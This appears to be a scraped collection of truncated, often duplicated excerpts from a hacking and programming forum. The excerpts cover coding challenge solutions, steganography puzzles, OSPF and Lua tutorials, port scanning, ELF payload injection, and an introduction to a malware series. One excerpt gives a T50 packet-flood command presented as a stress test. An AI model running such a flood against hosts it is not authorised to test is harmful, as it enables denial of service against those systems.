&quot;end # 2. sumprint &quot;\\nGrades Sum: #{sum}\\n&quot; # 3. averagemean = sum / grades.lengthprint &quot;Average Grade: #{mean}\\n&quot; &hellip;", "Since there is already a solution for the main challenge in python, here is a solution for the extra challenge in python: my_string = &quot;!XeXgXaXsXsXeXmX XtXeXrXcXeXsX XeXhXtX XmXaX XI&quot;message = &quot;&quot;.join([x for x in my_string if x != &quot;X&quot;])[::-1]print message", "My solution: grades = [70, 95, 30, 65, 100, 85, 55, 90, 95, 90, 45, 50.5]def grades_sum(grades):    total = 0    for grade in grades:         total += grade    return total    def grades_average(grades):    average = grades_sum(grades) / float(len(grades))    return average    def grade&hellip;", "I think it is\u2026 give me a couple days", "Looks  nice @0x00_Jinx. There a couple more techniques to inject payloads that may be added and make the module grow.", "I got bored so I used your code to create a Python module out of this. The code is on Pastebin The instructions are included in the source code in the comment at the top along with an example.", "as @0x00pf explained in his ELF injection tutorial, you can extract the .text (actualy code) from an ELF (binary) file to get the payload. There are many ways to do this and picoflamingo showed us one way. Today I will share a shell script I wrote that does the same thing and prints it in ascii on&hellip;", "as @0x00pf explained in his ELF injection tutorial, you can extract the .text (actualy code) from an ELF (binary) file to get the payload. There are many ways to do this and picoflamingo showed us one way. Today I will share a shell script I wrote that does the same thing and prints it in ascii on&hellip;", "I\u2019m sure you all have solved this last crypto challenge, but in case you don\u2019t . This is a short write up on how to get the hidden message. You can use different tools to achieve what is described below. I\u2019m going to use GNU/Linux command-line tools to get the message out of the file. Let\u2019s go. Lo&hellip;", "I thought of coding my way around it but I scrapped it. I\u2019m curious if it\u2019s possible.", "The idea was to just post the FLAC file\u2026 but that is not allowed, so I had to fit the audio inside an image. That may have made the challenge a bit misleading.", "Damn, thank you for posting the solution because I was trying with a completely different way which wouldn\u2019t lead me anywhere. Sweet challenge, keep them coming pico!", "I\u2019m sure you all have solved this last crypto challenge, but in case you don\u2019t . This is a short write up on how to get the hidden message. You can use different tools to achieve what is described below. I\u2019m going to use GNU/Linux command-line tools to get the message out of the file. Let\u2019s go. Lo&hellip;", "I\u2019m sure you all have solved this last crypto challenge, but in case you don\u2019t . This is a short write up on how to get the hidden message. You can use different tools to achieve what is described below. I\u2019m going to use GNU/Linux command-line tools to get the message out of the file. Let\u2019s go. Lo&hellip;", "Hi @TheDoctor, Not being a cryptography expert myself, these are my first thoughts: The sqrt operation is quite costly. Normally you have to use an iterative/approximation process to calculate it. To my understanding, the key is not generated and then used, but calculated on-the fly as more digit&hellip;", "Thanks for sharing. I took a quick look to the code and it is surprisingly easy to follow. I suggest to anybody interested on low level networking (packet crafting) to take a look. I have to say, that it does not look like a DoS and definitely not a DDoS tool. It fills more like a networking diagn&hellip;", "That sentence is not fully correct and it is not the reason for the problem you described in the post. What is happening is that, once the python script finish, the pipe is closed and an EOF is sent. That EOF makes the system call returns immediately, as it assumes that the input is done. Your tec&hellip;", "Nice answer @0x00pf! Here are my thoughts on your\u2019s . Yes, I searched a bit if there\u2019s a good way of using some algorithm to calculate the square root digit by digit. The sqrt function has many downsides, but I didn\u2019t find a good way of doing it yourself. Another point was, that I was sure the fr&hellip;", "This is going to be short. Taking as starting point the last code challenge posted by @oaktree ( Programming Challenge #6 thanks @oaktree! ) and just out of curiosity,  I decided to take some memory performance numbers. This challenge was pretty straight forward and it does not looks like any of th&hellip;", "Nice answer @0x00pf! Here are my thoughts on your\u2019s . Yes, I searched a bit if there\u2019s a good way of using some algorithm to calculate the square root digit by digit. The sqrt function has many downsides, but I didn\u2019t find a good way of doing it yourself. Another point was, that I was sure the fr&hellip;", "Fantastic @airth. Congrats!", "Hi @TheDoctor, Not being a cryptography expert myself, these are my first thoughts: The sqrt operation is quite costly. Normally you have to use an iterative/approximation process to calculate it. To my understanding, the key is not generated and then used, but calculated on-the fly as more digit&hellip;", "Fantastic @airth. Congrats!", "Hello homies and homettes. I hope you are all having a great day so far. Welcome to Part 2 of the routing protocols series regarding OSPF. This time we are going to dig deeper in OSPF and try to visualize the \u201clow-level\u201d detail behind it. Allow me to take your hand and walk you through OSPF once aga&hellip;", "http://www.cprogramming.com/tutorial/shared-libraries-linux-gcc.html For more info on linking Another world opened for me @0x00pf Thanks again !!", "http://www.cprogramming.com/tutorial/shared-libraries-linux-gcc.html For more info on linking Another world opened for me @0x00pf Thanks again !!", "Thanks for sharing. I took a quick look to the code and it is surprisingly easy to follow. I suggest to anybody interested on low level networking (packet crafting) to take a look. I have to say, that it does not look like a DoS and definitely not a DDoS tool. It fills more like a networking diagn&hellip;", "Weekend Stego Challenge 2. Are You the Key Master?LEVEL: EASY You can get the message using command-line tools [image] The trickiest part was to get the message posted here  Hint1:Try to convert the image to pgm format Hint2:The actual data starts just after the mark in the file Hint3:You can&hellip;", "Weekend Stego Challenge 2. Are You the Key Master?LEVEL: EASY You can get the message using command-line tools [image] The trickiest part was to get the message posted here  Hint1:Try to convert the image to pgm format Hint2:The actual data starts just after the mark in the file Hint3:You can&hellip;", "Weekend Stego Challenge 2. Are You the Key Master?LEVEL: EASY You can get the message using command-line tools [image] The trickiest part was to get the message posted here  Hint1:Try to convert the image to pgm format Hint2:The actual data starts just after the mark in the file Hint3:You can&hellip;", "This is going to be short. Taking as starting point the last code challenge posted by @oaktree ( Programming Challenge #6 thanks @oaktree! ) and just out of curiosity,  I decided to take some memory performance numbers. This challenge was pretty straight forward and it does not looks like any of th&hellip;", "That is what I\u2019ve got in one of my machines. Just tried in another, number are a bit better, but still far away from the rest 8.9 MiB | 2.9MiB | 16.5MiB | 8.9 MiB | 8.1 MiB Note that the virtual memory is, in principle, memory that has been requested to the OS but that has not been used yet.", "Yes, I will try to uncover OSPF fully in the upcoming articles.", "That is what I\u2019ve got in one of my machines. Just tried in another, number are a bit better, but still far away from the rest 8.9 MiB | 2.9MiB | 16.5MiB | 8.9 MiB | 8.1 MiB Note that the virtual memory is, in principle, memory that has been requested to the OS but that has not been used yet.", "This is going to be short. Taking as starting point the last code challenge posted by @oaktree ( Programming Challenge #6 thanks @oaktree! ) and just out of curiosity,  I decided to take some memory performance numbers. This challenge was pretty straight forward and it does not looks like any of th&hellip;", "Thanks for sharing. I took a quick look to the code and it is surprisingly easy to follow. I suggest to anybody interested on low level networking (packet crafting) to take a look. I have to say, that it does not look like a DoS and definitely not a DDoS tool. It fills more like a networking diagn&hellip;", "It doesn\u2019t matter if is long when it is interesting!. Congrats again!", "We were missing you, but the wait was worth it. Brilliant post!", "We were missing you, but the wait was worth it. Brilliant post!", "Thanks for sharing. I took a quick look to the code and it is surprisingly easy to follow. I suggest to anybody interested on low level networking (packet crafting) to take a look. I have to say, that it does not look like a DoS and definitely not a DDoS tool. It fills more like a networking diagn&hellip;", "Thanks for sharing. I took a quick look to the code and it is surprisingly easy to follow. I suggest to anybody interested on low level networking (packet crafting) to take a look. I have to say, that it does not look like a DoS and definitely not a DDoS tool. It fills more like a networking diagn&hellip;", "Hello fellas, this is my first thread where I will show you T50 one powerful tool that can send lot of packets (tested on my own server and hitting fine). First you can download T50  here. If you want to run a stress test, run t50 (IP) -flood -S(this is protocol)(optional --turbo) in a termina&hellip;", "It doesn\u2019t matter if is long when it is interesting!. Congrats again!", "In order to complete the table in The Price of Scripting, I will add a couple more implementations: Lua#!/usr/bin/luan, t = io.read (&quot;*n&quot;, &quot;*n&quot;)w= {}for i=0, n - 1 do    w[i] = io.read(&quot;*n&quot;)endfor k=1, t do    i,j = io.read(&quot;*n&quot;, &quot;*n&quot;)    print (math.min(table.unpack(w, i, j)))endPerl&hellip;", "It doesn\u2019t matter if is long when it is interesting!. Congrats again!", "In order to complete the table in The Price of Scripting, I will add a couple more implementations: Lua#!/usr/bin/luan, t = io.read (&quot;*n&quot;, &quot;*n&quot;)w= {}for i=0, n - 1 do    w[i] = io.read(&quot;*n&quot;)endfor k=1, t do    i,j = io.read(&quot;*n&quot;, &quot;*n&quot;)    print (math.min(table.unpack(w, i, j)))endPerl&hellip;", "Thank you @0x00pf! It means a ton coming from you. I hope it wasn\u2019t too much of a read xD", "In order to complete the table in The Price of Scripting, I will add a couple more implementations: Lua#!/usr/bin/luan, t = io.read (&quot;*n&quot;, &quot;*n&quot;)w= {}for i=0, n - 1 do    w[i] = io.read(&quot;*n&quot;)endfor k=1, t do    i,j = io.read(&quot;*n&quot;, &quot;*n&quot;)    print (math.min(table.unpack(w, i, j)))endPerl&hellip;", "Thank you @0x00pf! It means a ton coming from you. I hope it wasn\u2019t too much of a read xD", "We were missing you, but the wait was worth it. Brilliant post!", "Thank you @0x00pf! It means a ton coming from you. I hope it wasn\u2019t too much of a read xD", "We were missing you, but the wait was worth it. Brilliant post!", "Long time no see, homies and homettes (probably none). Anyway, today I will do my best to explain to you one of the most widely known and used protocols for internet routing, known as OSPF. This post is not beginner friendly, and is kind of long, so hang in there. The article consists of theory and &hellip;", "Official Solution#include &lt;iostream&gt;#include &lt;string&gt;int main() {int t,n,d,j;std::cin &gt;&gt; t;while (t-- &gt; 0) {std::cin &gt;&gt; n &gt;&gt; d &gt;&gt; j;std::cout &lt;&lt; ((n*d - j)/60 + ( (n*d - j) % 60 &gt;= 30 ? 1 : 0) ) &lt;&lt; std::endl;}return 0;}This problem was pretty easy, so I\u2019ll be releasing a hard&hellip;", "#Python# from __future__ import divisiondef sober_up():    n,d,j = raw_input(&#39;[*] Input &gt; &#39;).split()    met = int(n) * int(d) - int(j)    met = met / 60t = int(raw_input(&#39;[*] Input the number of test cases &gt; &#39;))for i in range (0,t):    sober_up()It\u2019s slightly different from the instruct&hellip;", "Sure. I\u2019m old school. unit8_t is pretty common nowadays but it was not always available some time ago. If you work with old systems char is safer, but indeed you are right.", "That\u2019s a great idea! By why not uint8_t for expressiveness?", "Sure. I\u2019m old school. unit8_t is pretty common nowadays but it was not always available some time ago. If you work with old systems char is safer, but indeed you are right.", "@oaktree I think this overhead does not come much from the compilation, but all the high level constructors. Whenever you write one python line that doe a lot of stuff\u2026 it is actually doing a lot of stuff under the hood\u2026 because, at the end, the processor does what it can do\u2026 some basic logic/arithm&hellip;", "That\u2019s a great idea! By why not uint8_t for expressiveness?", "This is going to be short. Taking as starting point the last code challenge posted by @oaktree ( Programming Challenge #6 thanks @oaktree! ) and just out of curiosity,  I decided to take some memory performance numbers. This challenge was pretty straight forward and it does not looks like any of th&hellip;", "This is going to be short. Taking as starting point the last code challenge posted by @oaktree ( Programming Challenge #6 thanks @oaktree! ) and just out of curiosity,  I decided to take some memory performance numbers. This challenge was pretty straight forward and it does not looks like any of th&hellip;", "Working on a bot you say? No, not really. Although I am looking at an old Internet Worm.", "@oaktree I think this overhead does not come much from the compilation, but all the high level constructors. Whenever you write one python line that doe a lot of stuff\u2026 it is actually doing a lot of stuff under the hood\u2026 because, at the end, the processor does what it can do\u2026 some basic logic/arithm&hellip;", "Problem StatementDaniel, an ambitious young programmer, decides to go to a party one afternoon. However, having not partied often, Daniel has a bad tolerance for liqour. Given that it takes an integer n minutes for Daniel to metabolize the alcohol in one drink, how many hours after drinking his la&hellip;", "@oaktree I think this overhead does not come much from the compilation, but all the high level constructors. Whenever you write one python line that doe a lot of stuff\u2026 it is actually doing a lot of stuff under the hood\u2026 because, at the end, the processor does what it can do\u2026 some basic logic/arithm&hellip;", "What I was unaware of for a while is that modern scripting languages like Python and Ruby are actually compiled to bytecode when run (rather than interpreted [google the difference between MRI and YARV, two Ruby implementations]). The thing is, this runtime compilation brings about considerable ove&hellip;", "The values for the width array were 1,2,3. We just need to bits to store the information. C ensures that a char takes 1 byte so it just saves memory\u2026  A int array will use 2 bits out of 32 in best case\u2026 Note: It should be better to say that a char can store the minimal addressable element by the pr&hellip;", "This is going to be short. Taking as starting point the last code challenge posted by @oaktree ( Programming Challenge #6 thanks @oaktree! ) and just out of curiosity,  I decided to take some memory performance numbers. This challenge was pretty straight forward and it does not looks like any of th&hellip;", "Why do this\u2026 w = (char*) malloc (n);rather than\u2026 w = (int*)malloc(n);that? After all, you\u2019re collecting integers.", "This is going to be short. Taking as starting point the last code challenge posted by @oaktree ( Programming Challenge #6 thanks @oaktree! ) and just out of curiosity,  I decided to take some memory performance numbers. This challenge was pretty straight forward and it does not looks like any of th&hellip;", "This is going to be short. Taking as starting point the last code challenge posted by @oaktree ( Programming Challenge #6 thanks @oaktree! ) and just out of curiosity,  I decided to take some memory performance numbers. This challenge was pretty straight forward and it does not looks like any of th&hellip;", "Why do this\u2026 w = (char*) malloc (n);rather than\u2026 w = (int*)malloc(n);that? After all, you\u2019re collecting integers.", "A pure C version (no error checking) #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main (){  int  n, t, k, i, j, r;  char *w;  scanf (&quot;%d %d&quot;, &amp;n, &amp;t);  w = (char*) malloc (n);  for (i = 0; i &lt; n; scanf(&quot;%hhd &quot;, &amp;w[i++]));  for (k = 0; k &lt; t; k++)    {      scanf (&quot;%d %d&quot;, &amp;i, &amp;j);      fo&hellip;", "This is going to be short. Taking as starting point the last code challenge posted by @oaktree ( Programming Challenge #6 thanks @oaktree! ) and just out of curiosity,  I decided to take some memory performance numbers. This challenge was pretty straight forward and it does not looks like any of th&hellip;", "This is going to be short. Taking as starting point the last code challenge posted by @oaktree ( Programming Challenge #6 thanks @oaktree! ) and just out of curiosity,  I decided to take some memory performance numbers. This challenge was pretty straight forward and it does not looks like any of th&hellip;", "A pure C version (no error checking) #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main (){  int  n, t, k, i, j, r;  char *w;  scanf (&quot;%d %d&quot;, &amp;n, &amp;t);  w = (char*) malloc (n);  for (i = 0; i &lt; n; scanf(&quot;%hhd &quot;, &amp;w[i++]));  for (k = 0; k &lt; t; k++)    {      scanf (&quot;%d %d&quot;, &amp;i, &amp;j);      fo&hellip;", "// c++#include &lt;vector&gt;#include &lt;iostream&gt;#include &lt;algorithm&gt;int main(){    int n, t;    std::cin &gt;&gt; n &gt;&gt; t;    std::vector&lt;int&gt; width(n);        for (auto&amp; w : width) std::cin &gt;&gt; w;        int i,j;    while(t-- &gt; 0) {        std::cin &gt;&gt; i &gt;&gt; j;        std::cout &lt;&lt; *std::min_element(&hellip;", "Here\u2019s a Python solution: import sysdef GetMinSize(widthList, start, end):    requiredWidthsList = widthList[start:end + 1]    return min(requiredWidthsList)def Main():    n,t = raw_input().strip().split(&#39; &#39;)    n,t = [int(n),int(t)]    width = map(int,raw_input().strip().split(&#39; &#39;))    f&hellip;", "LEVEL: Beginner Port scanning is the process of finding out which ports are open in a given machine. An open port usually means a program listening on that port, and a program means bugs, and bugs means exploits\u2026 roughly :). OK, everybody in the world uses nmap for this task. It would be stupid to&hellip;", "Here\u2019s another fun Programming Challenge: Service Lane Source: https://www.hackerrank.com/challenges/service-lane Calvin is driving his favorite vehicle on the 101 freeway. He notices that the check engine light of his vehicle is on, and he wants to service it immediately to avoid any risks. Luck&hellip;", "Hey everyone! I\u2019m back with another Graph tutorial. This time, I plan to discuss Kruskal\u2019s Algorithm. Kruskal\u2019s Algorithm is one of a few algorithms (we\u2019ll get to the rest later) for finding an undirected graph\u2019s Minimum Spanning Tree (MST). A Minimum Spanning Tree is a tree connecting all nodes o&hellip;", "I see the good old DOS", "Sure, sniffers will come\u2026 actually in two different flavors", "I\u2019m starting a small series on Malware and I\u2019m going to attempt (if copyright laws allow) to try to make a free open source antivirus. And really regards to @pry0cc with his always nice and informative comments, @oaktree with all his wise and knowledgeable posts and comments, and @0x00pf who is abso&hellip;", "The thing is, studies never come to a close.", "Awesome! Great to hear your studies are coming to a close, being able to wrap up your work of several years is surely satisfying. At the moment we are working towards getting a CTF underway, which should be really good. Afaik, @oaktree is working on minimum spanning trees and a lot of algorithm stu&hellip;", "#! /usr/bin/ruby$balance = 100def flipCoin(bet, predict)    if ((bet == 0) or (bet &gt; $balance))    puts &#39;[!] Invalid Bet!&#39;    return    end    return if (predict != &#39;heads&#39; and predict != &#39;tails&#39;)    result = Random.new().rand(2)    if ((result == 0 and predict == &#39;heads&#39;) or (re&hellip;", "from random import randintclass HeadsOrTails(object):    def __init__(self):self.balance = 100def flipCoin(self, bet, prediction):flip = randint(0, 1)if (prediction == &#39;heads&#39; and flip == 0) or (prediction == &#39;tails&#39; and flip == 1):print &#39;[*] You won!\\n&#39;self.balance += bet*2&hellip;", "Lol exception handling. That could be considered \u201coverboard.\u201d", "Lol. DOS was just great. Never got to play around with it as much as I wanted though\u2026", "When it\u2019s finished, then I will", "Reminds me of when I used to hide a cipher in a picture, and see if anyone ever thought of checking out the picture up close! Good job! Yet again you amaze me with these absolutely great posts!", "I\u2019m starting a small series on Malware and I\u2019m going to attempt (if copyright laws allow) to try to make a free open source antivirus. And really regards to @pry0cc with his always nice and informative comments, @oaktree with all his wise and knowledgeable posts and comments, and @0x00pf who is abso&hellip;", "I see the good old DOS", "Lol. DOS was just great. Never got to play around with it as much as I wanted though\u2026", "Awesome! Great to hear your studies are coming to a close, being able to wrap up your work of several years is surely satisfying. At the moment we are working towards getting a CTF underway, which should be really good. Afaik, @oaktree is working on minimum spanning trees and a lot of algorithm stu&hellip;", "I\u2019ve been studying Java recently, so there shouldn\u2019t be any duplicate content.", "I\u2019ve been studying Java recently, so there shouldn\u2019t be any duplicate content.", "@Defalt: @0x00pf likes Lua a lot.", "@Defalt, I know. I have read your great posts. I think it would depend on how much time I can spend of this. I will definitely talk about libpcap as all my post are C related. Let me know if you have plans to write something on that line so we do not duplicate efforts. I think it will be nice to ha&hellip;", "@Defalt: @0x00pf likes Lua a lot.", "What language do you plan on building these scanners in. If I may suggest, Python has an excellent packet crafting library named Scapy. -Defalt", "TFW we\u2019re just porting to different languages.", "I think Wireshark would also be a good fit in your series", "Sure, sniffers will come\u2026 actually in two different flavors", "I see the good old DOS", "TFW we\u2019re just porting to different languages.", "A implementation on C\u2026 with some macro abuse and debug traces  #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#ifdef DEBUG#define PDEBUG(fmt, arg...) fprintf (stderr, &quot;DEBUG:&quot; fmt, ##arg)#else#define PDEBUG(fmt, args...) #endif#define read_int(str, var) printf (str); scanf(&quot;%d&quot;, &amp;var);char *msg[] &hellip;", "I see the good old DOS", "I plan on targeting all the major ones such as OSX, Windows, Linux, and so on. I\u2019ll also be doing the occasional article comparing modern day Malware against the older ones, and those will also be targeting much older OSes.", "Which OS/OSes are you planning to target?", "I plan on targeting all the major ones such as OSX, Windows, Linux, and so on. I\u2019ll also be doing the occasional article comparing modern day Malware against the older ones, and those will also be targeting much older OSes.", "A implementation on C\u2026 with some macro abuse and debug traces  #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#ifdef DEBUG#define PDEBUG(fmt, arg...) fprintf (stderr, &quot;DEBUG:&quot; fmt, ##arg)#else#define PDEBUG(fmt, args...) #endif#define read_int(str, var) printf (str); scanf(&quot;%d&quot;, &amp;var);char *msg[] &hellip;", "A implementation on C\u2026 with some macro abuse and debug traces  #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#ifdef DEBUG#define PDEBUG(fmt, arg...) fprintf (stderr, &quot;DEBUG:&quot; fmt, ##arg)#else#define PDEBUG(fmt, args...) #endif#define read_int(str, var) printf (str); scanf(&quot;%d&quot;, &amp;var);char *msg[] &hellip;", "Here\u2019s some C++ this time: #include &lt;iostream&gt;#include &lt;string&gt;#include &lt;algorithm&gt; void game() {    std::cout &lt;&lt; &quot;[*] How much money do you have? &quot;;    int user_money; std::cin &gt;&gt; user_money;     int user_bet, user_guess, toss;    while (user_money &gt; 0) {        std::cout &lt;&lt; &quot;[*] Place a&hellip;", "#HEADS or TAILS Hello again! Today\u2019s game is called HEADS or TAILS, but with a twist\u2026 You have money and bets! In other words, you input how much money you have and how much you\u2019re willing bet. You either bet HEADS or TAILS (duh\u2026), if you win, you\u2019ll multiply the money you bet by two and add to y&hellip;", "Which OS/OSes are you planning to target?", "Which OS/OSes are you planning to target?", "-Intro to the Series Hey everyone! As of recent I\u2019ve become insanely interested in Malware, which has resulted in me wanting to be a Malware Analyst. I mean to be honest you can do so much with Malware that it can be applied to most if not all aspects of cyber security, and hacking. However as of &hellip;", "Oh man Pico! You are killing it with content lately! Nice job!", "@oaktree to mask the lower 7 bits where the message character goes (each character is 7bits). If you just add, the blue component can overflow (go over 255). As the value cannot be clamped (otherwise you cannot recover the stored character) it will have a very noticeable impact on the image (a origi&hellip;", "LEVEL: Beginner Port scanning is the process of finding out which ports are open in a given machine. An open port usually means a program listening on that port, and a program means bugs, and bugs means exploits\u2026 roughly :). OK, everybody in the world uses nmap for this task. It would be stupid to&hellip;", "As requested here is the program used to produce the image for the Basic Stego challenge we published yesterday. If you are still trying to solve it, you may want to wait to read this. The image was generated with a very simple C program using libgd. `libgd\u2019 (http://libgd.github.io/) is a classica&hellip;", "LEVEL: Beginner Port scanning is the process of finding out which ports are open in a given machine. An open port usually means a program listening on that port, and a program means bugs, and bugs means exploits\u2026 roughly :). OK, everybody in the world uses nmap for this task. It would be stupid to&hellip;", "Welcome to this new series intended to explain the guts of all those hacker\u2019s tools out there you use or want to use\u2026 Basically, we are going to explain you how does they work and how do you can build your own\u2026 Keep reading if you do not want to be a Skid ;). We will start the series with Proxychai&hellip;", "LEVEL: Beginner Port scanning is the process of finding out which ports are open in a given machine. An open port usually means a program listening on that port, and a program means bugs, and bugs means exploits\u2026 roughly :). OK, everybody in the world uses nmap for this task. It would be stupid to&hellip;", "@oaktree to mask the lower 7 bits where the message character goes (each character is 7bits). If you just add, the blue component can overflow (go over 255). As the value cannot be clamped (otherwise you cannot recover the stored character) it will have a very noticeable impact on the image (a origi&hellip;", "As requested here is the program used to produce the image for the Basic Stego challenge we published yesterday. If you are still trying to solve it, you may want to wait to read this. The image was generated with a very simple C program using libgd. `libgd\u2019 (http://libgd.github.io/) is a classica&hellip;", "Why do you use &amp; here?", "@oaktree to mask the lower 7 bits where the message character goes (each character is 7bits). If you just add, the blue component can overflow (go over 255). As the value cannot be clamped (otherwise you cannot recover the stored character) it will have a very noticeable impact on the image (a origi&hellip;", "Someone has to check your passport because you are from another planet mate.", "Loved the article! Thanks for the info!", "LEVEL: Beginner Port scanning is the process of finding out which ports are open in a given machine. An open port usually means a program listening on that port, and a program means bugs, and bugs means exploits\u2026 roughly :). OK, everybody in the world uses nmap for this task. It would be stupid to&hellip;", "Sure. I generate the image with a small program I wrote. I do not know if it is possible to generate the file just using a image processing tool. I will post the code later anyway a bit later today (I\u2019m finishing something else).", "LEVEL: Beginner Port scanning is the process of finding out which ports are open in a given machine. An open port usually means a program listening on that port, and a program means bugs, and bugs means exploits\u2026 roughly :). OK, everybody in the world uses nmap for this task. It would be stupid to&hellip;", "LEVEL: Beginner Port scanning is the process of finding out which ports are open in a given machine. An open port usually means a program listening on that port, and a program means bugs, and bugs means exploits\u2026 roughly :). OK, everybody in the world uses nmap for this task. It would be stupid to&hellip;", "As requested here is the program used to produce the image for the Basic Stego challenge we published yesterday. If you are still trying to solve it, you may want to wait to read this. The image was generated with a very simple C program using libgd. `libgd\u2019 (http://libgd.github.io/) is a classica&hellip;", "LEVEL: Beginner Port scanning is the process of finding out which ports are open in a given machine. An open port usually means a program listening on that port, and a program means bugs, and bugs means exploits\u2026 roughly :). OK, everybody in the world uses nmap for this task. It would be stupid to&hellip;", "Why do you use &amp; here?", "As requested here is the program used to produce the image for the Basic Stego challenge we published yesterday. If you are still trying to solve it, you may want to wait to read this. The image was generated with a very simple C program using libgd. `libgd\u2019 (http://libgd.github.io/) is a classica&hellip;", "LEVEL: Beginner Port scanning is the process of finding out which ports are open in a given machine. An open port usually means a program listening on that port, and a program means bugs, and bugs means exploits\u2026 roughly :). OK, everybody in the world uses nmap for this task. It would be stupid to&hellip;", "As requested here is the program used to produce the image for the Basic Stego challenge we published yesterday. If you are still trying to solve it, you may want to wait to read this. The image was generated with a very simple C program using libgd. `libgd\u2019 (http://libgd.github.io/) is a classica&hellip;", "As requested here is the program used to produce the image for the Basic Stego challenge we published yesterday. If you are still trying to solve it, you may want to wait to read this. The image was generated with a very simple C program using libgd. `libgd\u2019 (http://libgd.github.io/) is a classica&hellip;", "LEVEL: Beginner Port scanning is the process of finding out which ports are open in a given machine. An open port usually means a program listening on that port, and a program means bugs, and bugs means exploits\u2026 roughly :). OK, everybody in the world uses nmap for this task. It would be stupid to&hellip;", "LEVEL: Beginner Port scanning is the process of finding out which ports are open in a given machine. An open port usually means a program listening on that port, and a program means bugs, and bugs means exploits\u2026 roughly :). OK, everybody in the world uses nmap for this task. It would be stupid to&hellip;", "Sure. I generate the image with a small program I wrote. I do not know if it is possible to generate the file just using a image processing tool. I will post the code later anyway a bit later today (I\u2019m finishing something else).", "[image] LEVEL: VERY EASY Note: The image was not generated with any steganography tool. Note2: In this case, the message can be extracted without coding. Hint 1:GIMP is your friend Hint 1.5:Use the Color&gt;Components&gt;Decompose to get the image components separated. Hint 2:PGM format saves grey s&hellip;", "[image] LEVEL: VERY EASY Note: The image was not generated with any steganography tool. Note2: In this case, the message can be extracted without coding. Hint 1:GIMP is your friend Hint 1.5:Use the Color&gt;Components&gt;Decompose to get the image components separated. Hint 2:PGM format saves grey s&hellip;", "Welcome to this new series intended to explain the guts of all those hacker\u2019s tools out there you use or want to use\u2026 Basically, we are going to explain you how does they work and how do you can build your own\u2026 Keep reading if you do not want to be a Skid ;). We will start the series with Proxychai&hellip;", "The connect function you speak of, is that the function I find with command: objdump -T /usr/bin/lynx | grep connect ?", "Nice! Holy cow, I don\u2019t think I will be finished reading this article today but so far its incredibly detailed and informative. Great job!", "@unh0lys0da yes that is the one! @Wawa thanks for reading and I\u2019m glad to hear you liked it", "Alright, so for some weird reason, there is no DNS header in Linux. that\u2019s why I decided to write one: /*    DNS Header for packet forging    Copyright (C) 2016 unh0lys0da    This program is free software: you can redistribute it and/or modify    it under the terms of the GNU General Public L&hellip;", "[image] LEVEL: VERY EASY Note: The image was not generated with any steganography tool. Note2: In this case, the message can be extracted without coding. Hint 1:GIMP is your friend Hint 1.5:Use the Color&gt;Components&gt;Decompose to get the image components separated. Hint 2:PGM format saves grey s&hellip;", "Welcome to this new series intended to explain the guts of all those hacker\u2019s tools out there you use or want to use\u2026 Basically, we are going to explain you how does they work and how do you can build your own\u2026 Keep reading if you do not want to be a Skid ;). We will start the series with Proxychai&hellip;", "@0x00pf can probably help you out with your pointer dark magic.", "With a OOP twist import randomclass Game:  def __init__(self):      print &quot;SinglePlayer Mode!\\n&quot;      def chose_number (self):      self.number = int(random.randint (0,100))  def play (self):      while True:          guess = int(raw_input (&#39;Guess the number &gt; &#39;))          if guess &gt; se&hellip;", "Congrats!.. Next one will be more difficult", "@Acarnage Use [spoiler] ... [/spoiler]", "@Acarnage Use [spoiler] ... [/spoiler]", "Arrrrg this make me mad  I can now see some letter (i\u2019m playing with some gray levels on blue channel) but no idea how to get the perfect result  PS: How can i hide my words in order to avoid spoil ?", "man ppm Check the SEE ALSO section, the format to use is listed there", "Then, you have to open the first Hint", "With a OOP twist import randomclass Game:  def __init__(self):      print &quot;SinglePlayer Mode!\\n&quot;      def chose_number (self):      self.number = int(random.randint (0,100))  def play (self):      while True:          guess = int(raw_input (&#39;Guess the number &gt; &#39;))          if guess &gt; se&hellip;", "With a OOP twist import randomclass Game:  def __init__(self):      print &quot;SinglePlayer Mode!\\n&quot;      def chose_number (self):      self.number = int(random.randint (0,100))  def play (self):      while True:          guess = int(raw_input (&#39;Guess the number &gt; &#39;))          if guess &gt; se&hellip;", "[image] LEVEL: VERY EASY Note: The image was not generated with any steganography tool. Note2: In this case, the message can be extracted without coding. Hint 1:GIMP is your friend Hint 1.5:Use the Color&gt;Components&gt;Decompose to get the image components separated. Hint 2:PGM format saves grey s&hellip;", "Ah thanks mate! I\u2019ll keep the idea in mind!", "This is a very good point. It makes me recall my first steps with Arduinos. For years I knew about the devices but I never tried. All those electronics looked way too advanced to me. It just looked out of scope. But one day I decided to try. Indeed it required a little bit of effort but very quickl&hellip;", "This is awesome  I\u2019ve always liked Lua.", "I think i may have just fell in love with Lua\u2026 Time to play around a bit. My time long spent with python may start to suffer now  Great post!", "Nice Tutorial man! I wonder though, is there any other languages we can extend with a different language? I mean, we have C extending Python, and now we have Lua extending C, so there has to be more right?", "Almost any single scripting language out there have this possibility. I have personally tried: PythonGuile (the GNU scheme version)Mono (it provides a pretty good interface)Perl (maybe one of the trickiest)Java (via JNI\u2026 a lot more verbose that all others)tcl/tk (also very easy and a quick wa&hellip;", "Thanks @unh0lys0da. Glad to hear you liked. I\u2019m really looking forward to your packet forging articles\u2026 and going the Perl way is really cool!!!", "Awesome tutorial man ^^ I had been thinking about learning Lua for a while. Also Ada, however I found out I don\u2019t have to write missile guiding software, or Nuclear Power Plant driver modules, so I let that one slide. Anyway I think this might be the perfect midway, between C and a scripting lang&hellip;", "I see how this may be unclear, that was meant for Cromical.", "What if I told you\u2026 this already exists, and is easier to do in PHP\u2026", "Then you are a pico hater and you should be ashamed!", "Sounds interesting @Cromical . As @oaktree said, there are many different ways of doing something. I think all of them are valuable in a sense, at least, you will always learn something which is a good thing. This Python idea looks interesting in the sense that you can build in one single program y&hellip;", "Great article! I honestly thought that Lua was used for scripting in video games. And at the end of the article you said [quote=\u201c0x00pf, post:1, topic:593\u201d] Do you have an idea for a hacking tool using an scripting language?.. Let us know! [/quote] And just to add on I believe I do\u2026 So how the t&hellip;", "@0x00_Jinx, it is GPL do whatever you want with it. This is what it is intended for. I will be glad to see it is useful to other people!", "No, we are not going to talk about space travelling, or interplanetary missions. No. We are going to talk about Lua. Lua is Portuguese for Moon and it is a very nice scripting language that is usually hidden behind the Python hype. Anyway, why are we talking about Lua?. Well, I have been planning t&hellip;", "That is a great idea, oaktree! @0x00pf, would it be okay if I used your code to make a ELF Injector with a 